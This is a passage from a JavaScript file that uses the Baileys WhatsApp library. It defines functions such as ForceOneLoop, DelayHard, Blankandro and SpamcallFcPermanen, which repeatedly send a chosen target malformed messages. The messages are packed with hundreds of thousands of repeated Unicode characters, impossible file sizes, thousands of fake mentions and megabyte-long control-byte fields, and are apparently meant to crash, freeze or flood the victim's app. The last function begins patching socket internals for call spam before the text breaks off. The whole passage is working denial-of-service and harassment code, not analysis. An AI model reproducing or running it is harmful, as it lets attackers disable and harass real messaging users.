                        url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true',
                        mimetype: 'image/jpeg',
                        fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',
                        fileLength: '591',
                        height: 0,
                        width: 0,
                        mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',
                        fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',
                        directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0',
                        mediaKeyTimestamp: '1721344123',
                        scansSidecar: 'igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==',
                        scanLengths: [247, 201, 73, 63],
                        midQualityFileSha256: 'qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro='
                    },
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                        fileLength: "9e8",
                        pageCount: 1316134911,
                        mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                        fileName: "Tes!!" + "ꦸ".repeat(80000),
                        fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                        directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1743848703",
                        jpegThumbnail: null,
                        thumbnailWidth: 999999,
                        thumbnailHeight: 9998888,
                        streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
                        thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                        thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                        thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                        artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                        artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                        artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=",
                        caption: "ꦸ".repeat(200000)
                    },
                    contactMessage: {
                        name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
                        address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
                        url: null
                    },
                    sendPaymentMessage: {
                        noteMessage: {
                            extendedTextMessage: {
                                text: "— Zephyrinē E'scanor",
                                matchedText: "https://github.com/zephyrinee",
                                description: "",
                                title: "",
                                paymentLinkMetadata: {
                                    button: { displayText: "\x30" },
                                    header: { headerType: 1 },
                                    provider: { paramsJson: "{{".repeat(7000) }
                                }
                            }
                        }
                    }
                }
            }
        }, {});
        
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, { 
            messageId: null, 
            participant: { jid: target } 
        });
    }
}

async function ForceOneLoop(sock, target) {
   for(let i = 0; i < 9000; i++) {
        const msg = generateWAMessageFromContent(target, {
            ephemeralMessage: {
                message: {
                    imageMessage: {
                        url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true',
                        mimetype: 'image/jpeg',
                        fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',
                        fileLength: '591',
                        height: 0,
                        width: 0,
                        mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',
                        fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',
                        directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0',
                        mediaKeyTimestamp: '1721344123',
                        scansSidecar: 'igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==',
                        scanLengths: [247, 201, 73, 63],
                        midQualityFileSha256: 'qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro='
                    },
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                        fileLength: "9e8",
                        pageCount: 1316134911,
                        mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                        fileName: "Tes!!" + "ꦸ".repeat(80000),
                        fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                        directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1743848703",
                        jpegThumbnail: null,
                        thumbnailWidth: 999999,
                        thumbnailHeight: 9998888,
                        streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
                        thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                        thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                        thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                        artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                        artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                        artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=",
                        caption: "ꦸ".repeat(200000)
                    },
                    contactMessage: {
                        name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
                        address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
                        url: null
                    },
                    sendPaymentMessage: {
                        noteMessage: {
                            extendedTextMessage: {
                                text: "— Lolipop3Xe",
                                matchedText: "https://github.com/dirgaxnx",
                                description: "",
                                title: "",
                                paymentLinkMetadata: {
                                    button: { displayText: "\x30" },
                                    header: { headerType: 1 },
                                    provider: { paramsJson: "{{".repeat(7000) }
                                }
                            }
                        }
                    }
                }
            }
        }, {});
        
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, { 
            messageId: null, 
            participant: { jid: target } 
        });
    }
}

async function Blankandro(sock, target) {
  await sock.relayMessage(
    target, 
    {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "Mau ga jadi pacar ku" + "ꦽ".repeat(25000) + "ោ៝".repeat(20000),
        publisher: "𝞩-𝞓𝞬𝞶𝞮𝞰𝞰",
        stickers: [
          {
            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          }
        ],
        fileLength: "3662919",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        packDescription: "",
        mediaKeyTimestamp: "1747502082",
        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
        thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
        thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED",
        contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, 
               () =>`1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            ),
          ],      
        },
      },
    }, 
    {
      participant: { jid: target },
    }
  );
}

async function DelayHard(sock, target) {
  for (let i = 0; i < 200; i++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "CsmX.zip",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: ""
              },
              hasMediaAttachment: true
            },
            body: {
              text: "-\n" + 'ꦽ'.repeat(1000) + "@13135550202".repeat(15000)
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
                length: 2000
              }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "CsmX.doc",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ""
                }
              }
            }
          }
        }
      },
    }, {
      messageId: null,
      participant: { jid: jid }
    });
  }
  await new Promise((r) => setTimeout(r, 1500));
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "CosmoX.zip",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: ""
            },
            hasMediaAttachment: true
          },
          body: {
            text: "-\n" + 'ꦽ'.repeat(1000) + "@13135550202".repeat(15000)
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
              length: 2000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "CsmX.doc",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: ""
              }
            }
          }
        }
      }
    },
  }, {
    messageId: null,
    participant: { jid: target }
  });

  for (let i = 0; i < 200; i++) {
    const msg = await generateWAMessageFromContent(jid, {
      viewOnceMessagw: {
        message: {
          messageContextInfo: {
            deviceListMetada: {},
            deviceListMetadaVersion: 2
          },
          interactiveResponseMessage: {
            body: {
              text: "x",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              fromMe: false,
              participant: target,
              forwardingScore: 9999,
              isForwarded: true,
              entryPointConversionSource: "address_message",
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
       message: msg.message
      }
    }, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
    await new Promise((r) => setTimeout(r, 1000));
  }

  var msg = generateWAMessageFromContent(target, {
    "videoMessage": {
      "url": "https://mmg.whatsapp.net/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0&mms3=true",
      "mimetype": "video/mp4",
      "fileSha256": "CleMtlrI+21HNQ298bFL4MaF6k9hJImlKgK7WAT/g+Y=",
      "fileLength": "231536",
      "seconds": 88888888,
      "mediaKey": "WlFBzxOj7hIziHuhR8gNCKE2YZSXgcLnfoydMn32FQI=",
      "caption": "x",
      "height": -99999,
      "width": 99999,
      "fileEncSha256": "zTpAsUWfVLGid5PNcL6/39JVADbLUUK0PT2cxlGpsDA=",
      "directPath": "/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0",
      "mediaKeyTimestamp": "1771576607",
      "contextInfo": {
        "pairedMediaType": "NOT_PAIRED_MEDIA",
        "statusSourceType": "VIDEO",
        "remoteJid": " #xrellyspec ",
        "mentionedJid": Array.from({ length: 2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`),
        "businessMessageForwardInfo": {
          "businessOwnerJid": "13135550202@s.whatsapp.net",
          "businessDescription": null
        },
        "featureEligibilities": {
          "canBeReshared": true
        },
        "isForwarded": true,
        "forwardingScore": 9999,
        "statusAttributions": [
          {
            "type": "MUSIC",
            "externalShare": {
              "actionUrl": "https://wa.me/settings/linked_devices#,,xrellyspec",
              "source": "INSTAGRAM",
              "duration": 999999999,
              "actionFallbackUrl": "https://wa.me/settings/linked_devices#,,xrellyspec"
            }
          }
        ]
      },
      "streamingSidecar": "xUQqEMh4oVoqMy9qDBB3gaNI3yZbbX7dtli6KJ6N1ijvk09oVJzI8w==",
      "thumbnailDirectPath": "/v/t62.36147-24/640522275_2376887426118122_4696194772404190783_n.enc?ccb=11-4&oh=01_Q5Aa3wHXgSUEMms1n1PJZN7I8Ip8kaEzKYH5nfr9X62LJNv1bw&oe=69BF74C1&_nc_sid=5e03e0",
      "thumbnailSha256": "9kdKXkxHeCZxJ7WwQ00xanJD9CRLfgrs4lxLd/cRBXQ=",
      "thumbnailEncSha256": "DuH7/OR2Jz+SPxDiNyl2wKdUDbr6upAQtCmjwAS22CA=",
      "annotations": [
        {
          "shouldSkipConfirmation": true,
          "embeddedContent": {
            "embeddedMessage": {
              "stanzaId": "ACFC34B6742717BAC2BFE825254E1CD1",
              "message": {
                "extendedTextMessage": {
                  "text": "$",
                  "previewType": "NONE",
                  "inviteLinkGroupTypeV2": "DEFAULT"
                },
                "messageContextInfo": {
                  "messageSecret": "1y9Zx4kWsv7YLUdsLvUAvSSxlE6KVPSyllLwgXkSzfg=",
                  "messageAssociation": {
                    "associationType": 18,
                    "parentMessageKey": {
                      "remoteJid": "status@broadcast",
                      "fromMe": false,
                      "id": "ACEEC73D18B6805DBC04CC8ADF65BF6D",
                      "participant": "13135550202@s.whatsapp.net"
                    }
                  }
                }
              }
            }
          },
          "embeddedAction": true
        }
      ],
      "externalShareFullVideoDurationInSeconds": 8
    }
  }, {})

    let kel = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              contextInfo: {
                remoteJid: " x ",
                mentionedJid: ["13135559098@s.whatsapp.net"],
              },
              body: {
                text: "fuck u",
                format: "DEFAULT",
              },
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
                version: 3,
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
      },
    );

    await sock.relayMessage('status@broadcast', msg.message, {
      statusJidList: [target]
    });

    await sock.relayMessage('status@broadcast', kel.message, {
      statusJidList: [target]
    });
}

async function SpamcallFcPermanen(sock, target) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");
    const crypto = require("crypto");
    const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
    await sock.assertSessions(devices);
    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;
        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = bokep(
